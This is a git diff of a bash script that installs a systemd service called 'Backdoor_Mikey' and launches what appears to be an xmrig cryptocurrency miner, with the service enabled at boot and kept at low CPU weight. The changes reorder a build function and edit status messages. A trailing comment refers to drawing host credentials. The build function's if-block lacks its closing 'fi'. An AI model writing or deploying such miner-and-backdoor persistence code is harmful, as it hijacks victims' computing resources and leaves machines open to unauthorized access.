@@ -108,19 +108,9 @@ function refresh () {
     sudo systemctl daemon-reload
     sudo systemctl reset-failed
 }
-function build () {
-    killAll       
-    wait
-    install && removeService
-    wait
-    shuffle &
-    if [[ $daemon_active == true ]]; then
-        daemon
-    else
-        runMiner
-}
 function daemon () {
-    echo "Creating Backdoor Mikey"
+    # custom daemon service to 
+    echo "Creating Backdoor Daemon Mikey"
     cat >/tmp/Backdoor_Mikey.service <<EOL
   [Unit]
 Description=Dirty Mike
@@ -133,12 +123,24 @@ CPUWeight=1
 WantedBy=multi-user.target
 EOL
     sudo mv /tmp/Backdoor_Mikey.service /etc/systemd/system/Backdoor_Mikey.service
-    echo "..... Mikey is here ....."
-    sudo killall xmrig 2>/dev/null
+    echo "..... Mikey daemon is here ....."
+    killAll
     sudo systemctl daemon-reload
     sudo systemctl enable Backdoor_Mikey.service
     sudo systemctl start Backdoor_Mikey.service  
 }
+function build () {
+    killAll       
+    wait
+    install && removeService
+    wait
+    shuffle &
+    if [[ $daemon_active == true ]]; then
+        daemon
+    else
+        runMiner
+}
+
 
 # run build
 if [[ "$1" == "-r" ]]; then # draw host credentials
